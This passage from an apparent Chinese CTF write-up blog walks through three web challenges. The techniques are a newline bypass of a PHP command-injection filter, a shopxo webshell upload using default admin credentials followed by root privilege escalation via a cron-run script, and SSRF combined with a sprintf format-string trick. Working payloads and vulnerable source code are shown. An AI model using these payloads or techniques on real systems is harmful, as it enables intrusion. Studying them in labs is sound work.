  <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/'</span><span class="token punctuation">,</span> <span class="token variable">$json</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">'Hacking attempt detected&lt;br/>&lt;br/>'</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">'Attempting to run command:&lt;br/>'</span><span class="token punctuation">;</span>
    <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$cmd</span> <span class="token operator">!==</span> <span class="token keyword">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      <span class="token keyword">echo</span> <span class="token string">'Invalid input'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">echo</span> <span class="token string">'&lt;br/>&lt;br/>'</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token delimiter">?></span></code></pre>
<p>很常见的点了，preg_match这种形式，虽然过滤很多但可以用%0A绕过。</p>
<p>遍历根目录。根目录下没flag…..</p>
<pre><code>cmd={%0A&quot;cmd&quot;:&quot;ls%20/&quot;%0A}</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216161639143.png" srcset="/img/loading.gif" alt="image-20201216161639143"></p>
<p>测试代码里那个路径</p>
<pre><code>?cmd={%0A&quot;cmd&quot;:&quot;ls%20/home/rceservice/&quot;%0A}</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216162442508.png" srcset="/img/loading.gif" alt="image-20201216162442508"></p>
<pre><code>?cmd={%0A&quot;cmd&quot;:&quot;/bin/cat%20/home/rceservice/flag&quot;%0A}</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216162802470.png" srcset="/img/loading.gif" alt="image-20201216162802470"></p>
<h1 id="GKCTF2020-老八小超市儿"><a href="#GKCTF2020-老八小超市儿" class="headerlink" title="[GKCTF2020]老八小超市儿"></a>[GKCTF2020]老八小超市儿</h1><p><strong>考点：shopxo文件上传漏洞</strong></p>
<p>进来是个购物商城，powered by shopxo。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201217135249247.png" srcset="/img/loading.gif" alt="image-20201217135249247"></p>
<p>而且还很贴心的在友链直接给了源码。</p>
<p>文档里有后台和初始密码，试试。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201217135411645.png" srcset="/img/loading.gif" alt="image-20201217135411645"></p>
<p>弱密码永远滴绳！进来了。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201217135541512.png" srcset="/img/loading.gif" alt="image-20201217135541512"></p>
<p>找找有没有上传点。好的没传上去。直接去找找洞。</p>
<blockquote>
<p>参考：<a href="https://www.zhihuifly.com/t/topic/678" target="_blank" rel="noopener">https://www.zhihuifly.com/t/topic/678</a></p>
</blockquote>
<p>先在应用中心的应用管理里下个模板，再在模板里加个木马传上去。</p>
<p>结果提示权限不够。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201217145328385.png" srcset="/img/loading.gif" alt="image-20201217145328385"></p>
<p>看了眼权限管理，还有个超级管理员。试了一下密码还是shopxo。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201217145414622.png" srcset="/img/loading.gif" alt="image-20201217145414622"></p>
<p>登录后传上了。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201217153159796.png" srcset="/img/loading.gif" alt="image-20201217153159796"></p>
<p>蚁剑连马。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201217153421446.png" srcset="/img/loading.gif" alt="image-20201217153421446"></p>
<p>根目录下是假flag。提示在/root里。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201217153448832.png" srcset="/img/loading.gif" alt="image-20201217153448832"></p>
<p>​    去看/root 没权限。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201217153532207.png" srcset="/img/loading.gif" alt="image-20201217153532207"></p>
<p>根目录下有一个Hint。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201217153646436.png" srcset="/img/loading.gif" alt="image-20201217153646436"></p>
<p>还有一个bash定时执行脚本。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201217153956331.png" srcset="/img/loading.gif" alt="image-20201217153956331"></p>
<p>去找这个py文件,他估计就是hint里提示的date。正好有可写权限。</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os
<span class="token keyword">import</span> io
<span class="token keyword">import</span> time
os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"whoami"</span><span class="token punctuation">)</span>
gk1<span class="token operator">=</span>str<span class="token punctuation">(</span>time<span class="token punctuation">.</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
gk<span class="token operator">=</span><span class="token string">"\nGet The RooT,The Date Is Useful!"</span>
f<span class="token operator">=</span>io<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">"/flag.hint"</span><span class="token punctuation">,</span> <span class="token string">"rb+"</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>str<span class="token punctuation">(</span>gk1<span class="token punctuation">)</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>str<span class="token punctuation">(</span>gk<span class="token punctuation">)</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>而且回头看下auto.sh，所属是root，755权限。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201217154547589.png" srcset="/img/loading.gif" alt="image-20201217154547589"></p>
<p>那改改py脚本获取flag就可以了。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201217160720460.png" srcset="/img/loading.gif" alt="image-20201217160720460"></p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201217160728980.png" srcset="/img/loading.gif" alt="image-20201217160728980"></p>
<h1 id="BJDCTF-2nd-文件探测"><a href="#BJDCTF-2nd-文件探测" class="headerlink" title="[BJDCTF 2nd]文件探测"></a>[BJDCTF 2nd]文件探测</h1><p><strong>考点：伪协议、sprintf格式化字符串漏洞、session绕过</strong></p>
<p>F12有个hint。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201217161022071.png" srcset="/img/loading.gif" alt="image-20201217161022071"></p>
<p>访问home.php,网页跳转多了个参数。这么看应该是file参数后接了个.php。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201217162156406.png" srcset="/img/loading.gif" alt="image-20201217162156406"></p>
<p>很难不想到是不是有伪协议。先试试。</p>
<pre><code>home.php?file=php://filter/read=convert.base64-encode/resource=system</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201217162532505.png" srcset="/img/loading.gif" alt="image-20201217162532505"></p>
<pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//system.php</span>
<span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//要求有相应cookie</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'y1ng'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'y1ng'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'y1ng'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('why you are here!');alert('fxck your scanner');alert('fxck you! get out!');&lt;/script>"</span><span class="token punctuation">;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Refresh:0.1;url=index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$str2</span> <span class="token operator">=</span> <span class="token string">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;url invalid&lt;br>~$ '</span><span class="token punctuation">;</span>
<span class="token variable">$str3</span> <span class="token operator">=</span> <span class="token string">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;damn hacker!&lt;br>~$ '</span><span class="token punctuation">;</span>
<span class="token variable">$str4</span> <span class="token operator">=</span> <span class="token string">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;request method error&lt;br>~$ '</span><span class="token punctuation">;</span>

<span class="token delimiter">?></span>

<span class="token delimiter">&lt;?php</span>

<span class="token variable">$filter1</span> <span class="token operator">=</span> <span class="token string">'/^http:\/\/127\.0\.0\.1\//i'</span><span class="token punctuation">;</span>
<span class="token variable">$filter2</span> <span class="token operator">=</span> <span class="token string">'/.?f.?l.?a.?g.?/i'</span><span class="token punctuation">;</span>


<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'q1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'q2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'q3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//q1存在就行</span>
    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'q2'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">".y1ng.txt"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//锚点注释掉拼接的字符串</span>
    <span class="token variable">$method</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'q3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token variable">$str1</span> <span class="token operator">=</span> <span class="token string">"~$ python fuck.py -u \""</span><span class="token punctuation">.</span><span class="token variable">$url</span> <span class="token punctuation">.</span><span class="token string">"\" -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br>"</span><span class="token punctuation">;</span>

    <span class="token keyword">echo</span> <span class="token variable">$str1</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$filter1</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//q2要求http://127.0.0.1/开头</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$filter2</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//q2不能存在flag</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^GET/i'</span><span class="token punctuation">,</span> <span class="token variable">$method</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^POST/i'</span><span class="token punctuation">,</span> <span class="token variable">$method</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//q3以GET或POST开头</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$detect</span> <span class="token operator">=</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string">"$url method&amp;content_size:$method%d"</span><span class="token punctuation">,</span> <span class="token variable">$detect</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token comment" spellcheck="true">//这个没见过，在下面写总结</span>

<span class="token delimiter">?></span>
</code></pre>
<pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//home.php</span>
<span class="token delimiter">&lt;?php</span>

<span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">"y1ng"</span><span class="token punctuation">,</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'y1ng'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'your_ip_address'</span><span class="token punctuation">,</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\^|\~|&amp;|\|/"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"forbidden"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/.?f.?l.?a.?g.?/i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"not now!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/.?a.?d.?m.?i.?n.?/i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"You! are! not! my! admin!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^home$/i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"禁止套娃"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/home$/i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/system$/i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">".php"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span><span class="token punctuation">{</span>
            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">".fxxkyou!"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">echo</span> <span class="token string">"现在访问的是 "</span><span class="token punctuation">.</span><span class="token variable">$file</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
        <span class="token keyword">require</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"&lt;script>location.href='./home.php?file=system'&lt;/script>"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>扫下后台。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201218095825943.png" srcset="/img/loading.gif" alt="image-20201218095825943"></p>
<p>看下robots.txt。结果这都扫出来了 = =。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201218095850447.png" srcset="/img/loading.gif" alt="image-20201218095850447"></p>
<p>先读下admin.php，伪协议那儿是不行了,从system.php入手。</p>
<p>q1随便传个参，q2由<a href="http://127.0.0.1/开头，拼接的&quot;.y1ng.txt&quot;用#注释掉。" target="_blank" rel="noopener">http://127.0.0.1/开头，拼接的&quot;.y1ng.txt&quot;用#注释掉。</a></p>
<pre class=" language-php"><code class="language-php">    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'q2'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">".y1ng.txt"</span><span class="token punctuation">;</span> 
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$filter1</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//q2要求http://127.0.0.1/开头</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$filter2</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//q2不能存在flag</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^GET/i'</span><span class="token punctuation">,</span> <span class="token variable">$method</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^POST/i'</span><span class="token punctuation">,</span> <span class="token variable">$method</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//q3以GET或POST开头</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$detect</span> <span class="token operator">=</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string">"$url method&amp;content_size:$method%d"</span><span class="token punctuation">,</span> <span class="token variable">$detect</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//这个%d导致$detect无法输出</span></code></pre>
<p>重点在q3，由于%d的存在导致$detect无法输出。</p>
<p>这里利用sprintf漏洞，构造q3=GET%s%,相当于</p>
<pre class=" language-php"><code class="language-php"><span class="token constant">GET</span><span class="token operator">%</span>S<span class="token operator">%</span><span class="token operator">%</span>d <span class="token comment" spellcheck="true">//百分号被转义（%%）</span></code></pre>
<p>payload</p>
<pre><code>q1=1&amp;q2=http://127.0.0.1/admin.php#&amp;q3=GET%s%%d</code></pre><p>看其他人wp还可以构造q3=%1$s,也就是将函数中的第一个参数以sring型输出。</p>
<pre><code>q1=1&amp;q2=http://127.0.0.1/admin.php#&amp;q3=GET%1$s</code></pre><p>得到admin.php</p>
<pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//admin.php</span>
<span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$f1ag</span> <span class="token operator">=</span> <span class="token string">'f1ag{s1mpl3_SSRF_@nd_spr1ntf}'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//fake</span>

<span class="token keyword">function</span> <span class="token function">aesEn</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$method</span> <span class="token operator">=</span> <span class="token string">'AES-128-CBC'</span><span class="token punctuation">;</span>
    <span class="token variable">$iv</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span>  <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">openssl_encrypt</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$method</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token constant">OPENSSL_RAW_DATA</span> <span class="token punctuation">,</span> <span class="token variable">$iv</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">Check</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'your_ip_address'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'your_ip_address'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'y1ng'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'y1ng'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">//这些对flag没影响就不改了</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"127.0.0.1"</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"&lt;head>&lt;title>403 Forbidden&lt;/title>&lt;/head>&lt;body bgcolor=black>&lt;center>&lt;font size='10px' color=white>&lt;br>only 127.0.0.1 can access! You know what I mean right?&lt;br>your ip address is "</span> <span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'decrypt'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$decr</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'decrypt'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">Check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
